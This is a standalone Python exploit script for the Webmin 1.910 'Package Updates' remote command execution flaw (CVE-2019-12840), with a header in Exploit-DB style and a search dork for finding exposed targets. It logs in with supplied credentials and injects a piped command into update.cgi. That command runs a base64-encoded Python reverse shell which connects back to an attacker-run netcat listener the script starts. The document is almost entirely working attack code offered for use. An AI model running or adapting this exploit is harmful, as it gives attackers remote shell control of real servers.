#Exploit-Title: Webmin 1.910 - 'Package Updates' Remote Command Execution(Standalone)
#Google Dork : inurl:":10000" intext:webmin
#Date : 2019-07-02
#Exploit Author : cokgorb
#Vendor Homepage : http://www.webmin.com/
#Software Link : https://prdownloads.sourceforge.net/webadmin/webmin_1.910_all.deb
#Version : 1.910
#Tested on : Debian 4.18.0
#CVE : CVE-2019-12840
#usage : python webmin_1-910_exploit.py -t TARGET_HOST -u USERNAME -p PASSWORD
#Description : Non-metasploit version of Webmin 1.910 - 'Package Updates' Remote Command Execution(Metasploit) EDB-ID: 46984.
#Description :  It can work as a standalone script.
#Description : respects to original author "AKKUS"
import sys
import socket
import argparse
import os
import base64
from threading import Thread
try:
        import requests
except ImportError:
        print("importing requests module is failed. run command 'pip install requests'.then try to run the exploit.")
        sys.exit(0)
ap=argparse.ArgumentParser()
ap.add_argument("-t","--host",required=True,help="target host's ip is necessary")
ap.add_argument("-u","--username",required=True,help="Webmin username")
ap.add_argument("-p","--password",required=True,help="Webmin password")
ap.add_argument("-pn","--port",required=False,default="10000",help="specify a target port(default is 10000")
ap.add_argument("-ssl","--ssl",required=False,default=False,help="if target is using https set this argument True")
ap.add_argument("-lh","--lhost",required=False,default=0, help="set lhost to connect on, default is your local ip")
ap.add_argument("-lp","--lport",required=False,default=44446,help="local port for target to connect on,default is 44446")
args=vars(ap.parse_args())
ip=args["host"]
port=args["port"]
secure=args["ssl"]
username=args["username"]
password=args["password"]
protocol=""
sock=socket.socket()
def nc():
	os.system("nc -lvp "+str(args["lport"]))
listen = Thread(target = nc, args = ())
listen.start()
localip=""
try:
	sock.connect((ip,int(port)))
	if(args["lhost"]==0):
		localip=sock.getsockname()[0]
except socket.error as error:
	print("couldn't connect to the target server due to error : "+str(error))
	sys.exit(0)
if(secure):
	protocol="https"
else:
	protocol="http"

payload="import socket, subprocess, os;host=\""+localip+"\";port="+str(args["lport"])+";s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((host, port));os.dup2(s.fileno(), 0);os.dup2(s.fileno(), 1);os.dup2(s.fileno(), 2);p=subprocess.call(\"/bin/bash\")"
bpayload=base64.b64encode(payload)
s = requests.session()
r = s.get(protocol+"://"+ip+":"+port)
r=s.post(protocol+"://"+ip+":"+port+"/session_login.cgi",data={'user':username,'pass':password})
if('Auth-type' in str(r.headers)):
	print("login to webmin failed, please check username and password")
	sys.exit(0)
refererh=(protocol+"://"+ip+":"+port+"/package-updates/update.cgi")
s.headers.update({'referer':refererh})
parameter=' | python -c \"exec(\''+bpayload+'\'.decode(\'base64\'))\"'
r = s.post(protocol+"://"+ip+":"+port+"/package-updates/update.cgi",data={
'u':['test/apt',parameter]
 })
